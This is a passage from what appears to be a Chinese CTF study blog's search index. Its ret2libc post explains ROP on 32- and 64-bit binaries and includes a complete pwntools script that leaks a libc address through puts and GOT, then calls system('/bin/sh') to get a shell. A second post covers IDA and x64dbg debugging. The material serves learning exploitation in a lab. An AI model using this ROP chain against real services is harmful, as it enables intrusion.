版本和地址时，必须先通过 GOT 泄露一个函数地址，才能计算出其他函数的地址。 什么时候能直接用 PLT？ 当你在本地调试、libc 是固定的，而且程序没开 PIE（地址不随机化）的时候，就可以直接调用 PLT。 ret2libc3 可以用 ret2syscall 的方法来攻击，只需要找到特定的、固定的 ROP gadgets 和 int 0x80 指令。 选择 ret2libc 的方法，通常是因为 system() 函数提供的便捷性更高，虽然多了一步 libc 泄露的开销，但在大多数情况下，这种方法更“简单”且更“通用”。 在实际的 CTF 比赛中，攻击者会根据目标程序的具体情况（是否有易于利用的 int 0x80、是否有足够的 gadgets、是否有 &quot;/bin/sh&quot; 字符串等）来选择最简单、最可靠的攻击方法。 ret2libc3 之所以需要泄露 libc 地址，是因为它依赖于调用 libc 库中（而非程序自身）的封装函数（如 system()），而这些 libc 函数的地址会受到 ASLR (地址空间布局随机化) 的影响而随机化。ret2syscall 能够不泄露 libc 地址，是因为它依赖于程序自身或加载到固定地址的共享库中的 ROP gadget 和 int 0x80 指令，这些地址在没有 PIE (位置无关可执行文件) 的情况下是固定的。 ret2libc3_x6432位程序的payload都是在返回地址之后加上参数，而64位是在返回地址之前把参数放入寄存器中 64位程序和32位程序的ROP技术的不同点在于参数传递的方式不同。64位程序的前6个参数是rdi,rsi,rdx,rcx,r8,r9，后续参数才会放在栈上，所以64位程序的ROP和ret2syscall几乎是一样的，都是先控制寄存器，再跳转到对应的函数进行操作。 脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from pwn import *from LibcSearcher import LibcSearcherp = process(&quot;./ret2libc3_x64&quot;)#gdb.attach(p,&quot;b *0x00000000004006F1&quot;)elf = ELF(&quot;./ret2libc3_x64&quot;)gets_got = elf.got[&quot;gets&quot;]puts_plt = elf.plt[&quot;puts&quot;]main_addr = elf.symbols[&quot;main&quot;]rdi = 0x0000000000400783 # pop rdi ; retret_gadget = 0x0000000000400784 # Assuming this is a &#x27;ret&#x27; instruction for stack alignmentp.recvuntil(b&quot;ret2libc3_x64\\n&quot;)payload1 = b&quot;a&quot; * (0x108)payload1 += p64(rdi) + p64(gets_got)payload1 +=p64(puts_plt)+p64(main_addr)p.sendline(payload1)leak_addr = u64(p.recv(6).ljust(8, b&quot;\\x00&quot;))libc = LibcSearcher(&quot;gets&quot;, leak_addr)libc_base = leak_addr - libc.dump(&quot;gets&quot;)#libc.address = libc_base#我感觉没什么用log.success(&quot;libc_base:&quot; + hex(libc_base))system = libc_base + libc.dump(&quot;system&quot;)binsh = libc_base + libc.dump(&quot;str_bin_sh&quot;)# ====== 修改开始：添加 GDB 动态下断点 ======gdb.attach(p, f&#x27;b *&#123;hex(system)&#125;&#x27;) # 在 system 地址处下断点# ====== 修改结束 ======p.recvuntil(b&quot;ret2libc3_x64\\n&quot;)payload2 = b&quot;a&quot; * (0x108)payload2 += p64(rdi) + p64(binsh)payload2 += p64(ret_gadget)payload2 += p64(system)p.sendline(payload2)p.interactive() 对于payload2由于考虑堆栈平衡，所以会有两个ret指令放在一起 payload2 +&#x3D; p64(rdi) + p64(binsh)payload2 +&#x3D; p64(ret_gadget) 堆栈平衡64位程序中，函数调用前，栈指针（rsp）必须是 16 字节对齐的 32位程序中，函数调用前后，栈指针 esp 的值应该保持不变（32位一般不考虑堆栈平衡） ✅ 一、静态分析：计算栈偏移 为了栈对齐（避免崩溃），你构造的 payload 中“除了填充部分”之外的内容（即 gadget 和参数）最好是一个偶数块（8 字节为一块） ✅ 二、动态调试：使用 GDB 查看 rsp 的值 对于这一题来说，在确定了libc.so库和libc基址之后，在system函数内在system处设置断点 之后运行这个脚本 这里就选择好libc版本了 之后动态调试查看 在刚进入这个函数的第一步，就已经处于不平衡的状态了 因为它在调用前是栈平衡，调用时会有push rsp 指令改变 查看栈顶的命令是 1info register rsp 注意对于构造的rop链 填充返回地址 填充的返回地址 效果 main() 让程序重新运行 main 函数（可重复利用） _start 重新开始整个程序 shellcode 地址 如果你想继续执行自己的代码 exit()或_exit() 安全退出程序 返回地址写0的时候偶尔会报错 返回地址处理🎯 2. 32 位 vs 64 位地址 项目 32 位 64 位 地址长度（位） 32 位 &#x3D; 4 字节 64 位 &#x3D; 8 字节 Python 里的表示 0xdeadbeef 0x7fffdeadbeef 打包函数 p32() p64() 解包函数 u32() u64() 32位接收 12leak = p.recv(4) # 32位泄露一般是4字节addr = u32(leak) # 转成 int 64位接收 12leak = p.recv(6) # 通常能收到6字节，有时候高两字节是0addr = u64(leak.ljust(8, b&#x27;\\x00&#x27;)) # 补成8字节再解包 ljust(length, fillchar) 会将当前的字节串 leak 左对齐到指定的 length（这里是 8 字节），并使用 fillchar（这里是 b&#39;\\x00&#39;，即空字节）从右侧进行填充。 查看调用函数的传递的参数1payload=b&#x27;a&#x27;*(0x48+4)+p32(sys)+p32(main_addr)+p32(sh_addr) 1. 初始状态（执行 ret 前） 假设此时栈布局如下（根据你的 payload）： python 1payload = b&#x27;a&#x27;*(0x48+4) + p32(sys) + p32(0x08048722) + p32(sh) 栈内存布局： text 123esp -&gt; 0x80484d0 （覆盖的返回地址，指向 system@plt）esp + 4 -&gt; 0x08048722 （伪造的返回地址）esp + 8 -&gt; 0x080482ea （参数 &quot;sh&quot; 的地址） 寄存器状态： eip：指向 GetFlag+90 的 ret 指令。 esp：指向栈顶 0x80484d0。 2. 执行 ret 指令 ret 等价于 pop eip，具体操作： 从栈顶弹出返回地址到 eip： eip = [esp] → eip = 0x80484d0（跳转到 system@plt）。 esp = esp + 4 → 栈指针上升 4 字节。 栈变化： text 12esp -&gt; 0x08048722 （原 esp + 4）esp + 4 -&gt; 0x080482ea （参数 &quot;sh&quot;） 3. 进入 system@plt 后的流程 (1) 首次调用 system@plt（GOT 未解析） system@plt 的代码： asm 1230x80484d0 &lt;system@plt&gt; jmp [0x804a024] ; 跳转到 GOT 表（首次指向下一行）0x80484d6 &lt;system@plt+6&gt; push 0x30 ; 重定位偏移0x80484db &lt;system@plt+11&gt; jmp 0x8048460 ; 跳转到动态链接器 jmp [0x804a024]： 首次调用时，GOT 表 0x804a024 中的值为 0x80484d6（即 system@plt+6），因此继续执行下一条指令。 push 0x30： esp = esp - 4 → 栈指针下降 4 字节。 [esp] = 0x30 → 将 0x30 压栈。 栈变化： text 123esp -&gt; 0x30 （新压入的值）esp + 4 -&gt; 0x08048722 （伪造的返回地址）esp + 8 -&gt; 0x080482ea （参数 &quot;sh&quot;） jmp 0x8048460： 跳转到动态链接器（_dl_runtime_resolve），解析 system 的真实地址并更新 GOT 表。 *(2) 动态链接器解析完成后 动态链接器会将 system 的真实地址写入 GOT 表 0x804a024。 后续跳转到 system 的真实代码。 4. 执行 system 函数时 (1) system 的调用约定（cdecl） 参数通过栈传递： call system 会隐式压入返回地址（但你的漏洞利用直接跳转到 system@plt，未通过 call）。 参数位于 esp + 4（因为 esp 指向返回地址）。 你的场景： 动态链接器解析完成后，直接跳转到 system 的真实代码。 此时栈布局： text 12esp -&gt; 0x08048722 （伪造的返回地址）esp + 4 -&gt; 0x080482ea （参数 &quot;sh&quot;） system 会从 esp + 4 读取参数（即 0x080482ea），执行 system(&quot;sh&quot;)。 (2) system 执行后的栈平衡 如果是正常 call system，调用者需通过 add esp, 4 清理参数。 但你的漏洞利用中： 通过 ret 跳转到 system@plt，未显式使用 call。 system 执行完毕后会返回到 0x08048722（伪造的地址）。 5. 全程 esp 变化总结 步骤 esp 变化 栈布局（栈顶向下） 执行 ret 前 esp → 0x80484d0 [0x80484d0, 0x08048722, 0x080482ea] 执行 ret esp += 4 → 0x08048722 [0x08048722, 0x080482ea] system@plt 中 push 0x30 esp -= 4 → 0x30 [0x30, 0x08048722, 0x080482ea] 动态链接器解析完成 esp 恢复为 0x08048722 [0x08048722, 0x080482ea] system 读取参数 从 esp + 4 读取 0x080482ea 参数 &quot;sh&quot; 被正确传递 6. 关键结论 ret 直接修改 eip 和 esp： 通过弹出返回地址实现控制流劫持，esp 会 +4。 system 的参数传递依赖栈布局： 确保 ret 后，esp + 4 指向参数地址（你的 payload 已满足）。 动态链接的额外栈操作： 首次调用 PLT 时会有 push 0x30，esp 会 -4，但最终不影响参数位置。 通过控制 ret 后的栈布局，你成功将 &quot;sh&quot; 传递给 system，最终获取 shell。","categories":[{"name":"pwn_study","slug":"pwn-study","permalink":"http://example.com/categories/pwn-study/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"}]},{"title":"ida使用+动调","slug":"ida使用-动调","date":"2025-03-19T11:50:43.000Z","updated":"2025-08-30T11:56:04.257Z","comments":true,"path":"2025/03/19/ida使用-动调/","permalink":"http://example.com/2025/03/19/ida%E4%BD%BF%E7%94%A8-%E5%8A%A8%E8%B0%83/","excerpt":"","text":"ida动态调试断点一般打的都是软件断点 硬件断点的设法：打好断点后 打开找到刚才打下的断点后右键Edit编辑勾选Hardware 差别： 1. 实现原理： 软件断点： 软件断点是通过修改程序指令来实现的。在代码中插入一个特定的中断指令（例如，在x86架构中是INT 3指令）。 调试器会记录被替换的原始指令，并在程序继续执行时恢复它。 硬件断点： 硬件断点不需要修改程序代码。 2. 资源限制： 软件断点： 软件断点在数量上没有严格的限制，可以在程序中的任意位置设置。 硬件断点： CPU提供的硬件断点寄存器数量有限，因此可以同时设置的硬件断点数量也有限。（最多四个） 3. 使用场景： 软件断点： 软件断点适用于大多数调试场景，特别是在需要设置大量断点时。 硬件断点： 硬件断点适用于以下场景： 调试无法修改代码的程序，例如只读内存中的代码。 调试需要精确控制执行流程的程序，例如内核代码或驱动程序。 调试数据断点，就是当某个内存地址被读取或者写入的时候出发断点，这是硬件断点特有的功能。 4. 隐蔽性： 软件断点： 软件断点会修改程序代码，因此可能会被一些反调试技术检测到。 硬件断点： 硬件断点不会修改程序代码，因此具有更高的隐蔽性。 总结： 软件断点灵活方便，适用于大多数调试场景，但可能会被反调试技术检测到。 硬件断点隐蔽性高，适用于特殊调试场景，但数量有限 条件断点 条件断点是一种在调试器中设置的断点，它仅在满足特定条件时才会触发。在框位置输入条件 更改字节选中要更改的那个字节 右键 更改之后Apply patch to 应用这个补丁 [FlareOn6]Overlong elf文件动态调试1.找到ida的根目录，找到dbgsrv文件，在该文件中找到 根据elf文件的进制选择（以64进制和snake.elf为例） 将linux server64和snake拖入文件夹中 之后在虚拟机终端内输出chmod +x linux_server64赋予文件执行权利 之后输入./linux_server64运行文件（之后等待主机连接） 再打开一个终端输入ip addr获取虚拟机ip地址 检测是否可以成功： 打开主机终端输入 ping +虚拟机ip(下图即为来连接成功) 之后打开Debugger&gt;Process options&gt; 1:填snake在虚拟机中的位置 2：填snake在虚拟机所在文件的文件位置 3：填虚拟机ip 4:运行.&#x2F;linux_server64后，输出Listening on 0.0.0.0:23946（一般默认） 之后就可以正常运行（下次运行时在此运行.&#x2F;linux_server64，并把文件拖入想相同目录即可） 显示所有机器码：​ Options&gt;general&gt;改为10 x64dbgF2：设置断点。）F4：运行到光标处F7：单步步入。（遇到call指令，进入call函数的实现处继续执行汇编指令）F8：单步步过。（遇到call指令，执行call函数，之后接着执行call指令的下一条指令）F9：运行程序（如果没有碰到断点，程序会一直执行到结束。） Ctrl+F9: 执行到函数返回处，用于跳出函数实现 Alt+F9:执行到用户代码，用于快速跳出系统函数 Ctrl+G:输入十六进制地址，快速定位到该地址处","categories":[{"name":"re_study","slug":"re-study","permalink":"http://example.com/categories/re-study/"}],"tags":[{"name":"RE","slug":"RE","permalink":"http://example.com/tags/RE/"},{"name":"花指令","slug":"花指令","permalink":"http://example.com/tags/%E8%8A%B1%E6%8C%87%E4%BB%A4/"}]}],"categories":[{"name":"pwn_study","slug":"pwn-study","permalink":"http://example.com/categories/pwn-study/"},{"name":"exercise_pwn","slug":"exercise-pwn","permalink":"http://example.com/categories/exercise-pwn/"},{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"},{"name":"exercise_re","slug":"exercise-re","permalink":"http://example.com/categories/exercise-re/"},{"name":"re_study","slug":"re-study","permalink":"http://example.com/categories/re-study/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"},{"name":"WP","slug":"WP","permalink":"http://example.com/tags/WP/"},{"name":"SROP","slug":"SROP","permalink":"http://example.com/tags/SROP/"},{"name":"csu","slug":"csu","permalink":"http://example.com/tags/csu/"},{"name":"栈迁移","slug":"栈迁移","permalink":"http://example.com/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/"},{"name":"orw","slug":"orw","permalink":"http://example.com/tags/orw/"},{"name":"stack","slug":"stack","permalink":"http://example.com/tags/stack/"},{"name":"code","slug":"code","permalink":"http://example.com/tags/code/"},{"name":"rax替代","slug":"rax替代","permalink":"http://example.com/tags/rax%E6%9B%BF%E4%BB%A3/"},{"name":"heap","slug":"heap","permalink":"http://example.com/tags/heap/"},{"name":"gdb","slug":"gdb","permalink":"http://example.com/tags/gdb/"},{"name":"Canary绕过","slug":"Canary绕过","permalink":"http://example.com/tags/Canary%E7%BB%95%E8%BF%87/"},{"name":"小端序","slug":"小端序","permalink":"http://example.com/tags/%E5%B0%8F%E7%AB%AF%E5%BA%8F/"},{"name":"one_gadget","slug":"one-gadget","permalink":"http://example.com/tags/one-gadget/"},{"name":"mprotect","slug":"mprotect","permalink":"http://example.com/tags/mprotect/"},{"name":"静态编译","slug":"静态编译","permalink":"http://example.com/tags/%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91/"},{"name":"fini_array","slug":"fini-array","permalink":"http://example.com/tags/fini-array/"},{"name":"分字节","slug":"分字节","permalink":"http://example.com/tags/%E5%88%86%E5%AD%97%E8%8A%82/"},{"name":"格式化字符串","slug":"格式化字符串","permalink":"http://example.com/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"},{"name":"ret2libc-printf","slug":"ret2libc-printf","permalink":"http://example.com/tags/ret2libc-printf/"},{"name":"RE","slug":"RE","permalink":"http://example.com/tags/RE/"},{"name":"花指令","slug":"花指令","permalink":"http://example.com/tags/%E8%8A%B1%E6%8C%87%E4%BB%A4/"},{"name":"TEA","slug":"TEA","permalink":"http://example.com/tags/TEA/"},{"name":"SMC","slug":"SMC","permalink":"http://example.com/tags/SMC/"}]}